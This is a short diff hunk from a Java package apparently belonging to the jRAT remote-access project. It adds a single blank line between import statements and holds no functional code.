@@ -2,6 +2,7 @@ package jrat.controller.packets.outgoing;
 
 import jrat.common.script.Script;
 import jrat.controller.Slave;
+
 import java.io.DataOutputStream;
 
 
